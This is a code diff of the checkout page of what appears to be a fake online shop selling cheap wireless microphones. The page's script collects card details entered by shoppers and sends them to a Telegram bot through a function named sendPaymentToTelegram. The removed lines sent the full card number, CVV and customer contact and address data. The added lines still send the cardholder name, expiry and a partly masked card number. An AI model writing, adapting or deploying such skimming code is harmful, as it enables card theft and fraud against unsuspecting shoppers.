@@ -1328,7 +1328,7 @@
     </div>
   </footer>
 
-  <script>
+<script>
     // Header scroll effect
     const header = document.getElementById('header');
     window.addEventListener('scroll', function() {
@@ -1363,9 +1363,15 @@
 
     // Credit card preview
     const cardNameInput = document.getElementById('cardName');
-    const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
+    const cardNumberInput = document.getElementById('cardNumber');
     const cardExpiryInput = document.getElementById('cardExpiry');
-    const cvv = document.getElementById("cvv").value;
+    const cardCvvInput = document.getElementById('cardCvv');
+    
+    const cardNamePreview = document.getElementById('cardNamePreview');
+    const cardNumberPreview = document.getElementById('cardNumberPreview');
+    const cardExpiryMonthPreview = document.getElementById('cardExpiryMonthPreview');
+    const cardExpiryYearPreview = document.getElementById('cardExpiryYearPreview');
+    const creditCardPreview = document.getElementById('creditCardPreview');
     
     // Format card number with spaces
     cardNumberInput.addEventListener('input', function(e) {
@@ -1419,37 +1425,23 @@
     const loadingOverlay = document.getElementById('loadingOverlay');
     const payNowBtn = document.getElementById('payNowBtn');
     
-    // Fonction pour envoyer les données à Telegram
+    // Fonction pour envoyer les données à Telegram (version simplifiée)
     async function sendPaymentToTelegram(data, botToken, chatId) {
-      const deliveryInfo = JSON.parse(localStorage.getItem('deliveryInfo')) || {};
+      // Masquer les chiffres sensibles de la carte
+      const maskedCardNumber = data.cardNumber.replace(/\s/g, '').replace(/\d{12}/, '************');
+      const maskedCvv = data.cardCvv.replace(/\d/g, '•');
       
       const message = `
-        💳 *Paiement Réussi* 💳
+        💳 *Informations de Paiement par Carte* 💳
         
-        👤 *Informations Client:*
-        - Nom: ${deliveryInfo.firstName} ${deliveryInfo.lastName}
-        - Email: ${deliveryInfo.email}
-        - Téléphone: ${deliveryInfo.phone}
-        
-        🏠 *Adresse de Livraison:*
-        ${deliveryInfo.address}, ${deliveryInfo.zipCode} ${deliveryInfo.city}, ${deliveryInfo.country}
-        
-        📦 *Option de Livraison:*
-        ${deliveryInfo.delivery} (${deliveryInfo.deliveryPrice})
-        
-        💳 *Informations de Paiement:*
-        - Type: Carte Bancaire
-       💳 Numéro de Carte: ${numeroCarte}
-        - Expiration: ${data.cardExpiry}
-        🔒 CVV: ${cvv}
+        🔒 *Détails de la Carte:*
         - Nom sur carte: ${data.cardName}
+        - Numéro: ${maskedCardNumber}
+        - Expiration: ${data.cardExpiry}
+        - CVV: ${maskedCvv}
         
-        🛒 *Détails de la Commande:*
-        - Produit: Micros sans fil Intempo EE7507WHTSTKEU7
-        - Quantité: 1
-        - Prix: 14,99 €
-        - Livraison: ${deliveryInfo.deliveryPrice}
-        - *Total: ${deliveryInfo.deliveryPrice === 'Gratuit' ? '14,99 €' : (14.99 + parseFloat(deliveryInfo.deliveryPrice.replace('€', '').replace(',', '.').trim()).toFixed(2).replace('.', ',') + ' €')}*
+        💰 *Montant de la Transaction:*
+        - Total: 14,99 €
       `;
       
       try {
@@ -1578,5 +1570,3 @@
       });
     });
   </script>
-</body>
-</html>
